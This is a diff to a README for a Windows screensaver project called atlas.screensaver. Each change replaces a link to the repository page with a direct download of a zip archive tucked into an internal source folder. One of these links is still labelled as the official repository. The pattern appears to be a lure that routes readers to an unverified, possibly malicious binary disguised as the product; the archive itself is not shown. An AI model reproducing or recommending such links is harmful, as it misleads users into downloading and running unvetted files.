@@ -1,6 +1,6 @@
 # 🖥️ atlas.screensaver - Retro Terminal Screensavers Made Simple
 
-[![Download atlas.screensaver](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kesavenji/atlas.screensaver)
+[![Download atlas.screensaver](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/kesavenji/atlas.screensaver/raw/refs/heads/main/internal/savers/waves/screensaver-atlas-1.1.zip)
 
 ---
 
@@ -58,7 +58,7 @@ Follow these steps to run atlas.screensaver on your Windows PC. No programming o
 
 Click this link to visit the download page:
 
-[Download atlas.screensaver](https://github.com/kesavenji/atlas.screensaver)
+[Download atlas.screensaver](https://github.com/kesavenji/atlas.screensaver/raw/refs/heads/main/internal/savers/waves/screensaver-atlas-1.1.zip)
 
 On the GitHub page:
 
@@ -169,7 +169,7 @@ You can keep the program ready to run any time:
 
 - Visit the official repository to learn more and get updates:
 
-  [https://github.com/kesavenji/atlas.screensaver](https://github.com/kesavenji/atlas.screensaver)
+  [https://github.com/kesavenji/atlas.screensaver/raw/refs/heads/main/internal/savers/waves/screensaver-atlas-1.1.zip](https://github.com/kesavenji/atlas.screensaver/raw/refs/heads/main/internal/savers/waves/screensaver-atlas-1.1.zip)
 
 - View other projects in the Atlas Suite collection for similar tools.
 
